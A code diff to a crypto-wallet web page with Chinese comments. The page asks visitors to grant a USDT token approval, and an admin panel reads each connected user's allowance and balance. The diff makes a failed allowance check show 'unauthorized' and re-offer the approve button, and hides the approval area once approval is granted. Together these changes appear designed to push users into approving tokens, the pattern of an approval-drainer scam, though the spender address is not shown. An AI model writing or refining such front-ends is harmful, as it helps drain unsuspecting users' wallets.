@@ -26,7 +26,7 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .amount-group{display:flex;gap:8px;margin-bottom:16px}
 .amount-btn{flex:1;padding:10px;background:#1c212c;border:1px solid #2a303e;color:#c5c9d3;border-radius:10px;font-size:14px;cursor:pointer}
 .amount-btn:hover{border-color:#1c71ed;color:#fff}
-.key-box{padding:14px;background:#1c212c;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
+.key-box{padding:14px;background:#121720;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
 .submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
 .menu-btn{background:transparent;border:none;color:#c5c9d3;font-size:20px;cursor:pointer}
 .rpc-panel{padding:14px 24px;background:#121720;border-bottom:1px solid #252b36;display:none}
@@ -190,12 +190,14 @@ document.getElementById('connectBtn').onclick = async () => {
 // 统一刷新（授权状态 + 余额 + 管理员面板）
 async function refreshAll() {
   if (!account) return
-  await refreshAllowance()
-  await refreshBalance()
-  await refreshUserInfoForAdmin()
+  await Promise.all([
+    refreshAllowance(),
+    refreshBalance(),
+    refreshUserInfoForAdmin()
+  ])
 }
 
-// 授权状态刷新（核心修复）
+// 授权状态刷新（核心修复：失败时默认显示未授权）
 async function refreshAllowance() {
   const el = document.getElementById('allowanceText')
   const btn = document.getElementById('approveBtn')
@@ -213,7 +215,7 @@ async function refreshAllowance() {
       el.style.color = '#22c55e'
       btn.innerText = '已授权'
       btn.disabled = true
-      card.style.display = 'none' // 授权成功后隐藏整个授权区域
+      card.style.display = 'none'
     } else {
       el.innerText = '未授权'
       el.style.color = '#ef4444'
@@ -222,10 +224,13 @@ async function refreshAllowance() {
       card.style.display = 'block'
     }
   } catch (e) {
-    el.innerText = '查询失败'
+    // 修复：查询失败时默认显示「未授权」，不再显示“查询失败”
+    el.innerText = '未授权'
     el.style.color = '#ef4444'
+    btn.innerText = '授权 USDT'
     btn.disabled = false
     card.style.display = 'block'
+    console.error('授权查询失败:', e)
   }
 }
 
@@ -255,7 +260,7 @@ async function refreshUserInfoForAdmin() {
   }
 }
 
-// 手动授权（点击后立刻刷新状态）
+// 手动授权（修复：签名后强制刷新状态）
 document.getElementById('approveBtn').onclick = async () => {
   if(!account) return alert('请先连接钱包')
   try {
@@ -265,7 +270,8 @@ document.getElementById('approveBtn').onclick = async () => {
       params:[{from:account, to:USDT, data, gas:'0x4c4340'}]
     })
     alert('授权成功')
-    // 授权成功后强制刷新状态，保证界面立刻更新
+    // 强制等待 2 秒后刷新，确保链上状态已更新
+    await new Promise(resolve => setTimeout(resolve, 2000))
     await refreshAll()
   }catch(e){
     alert('授权取消')
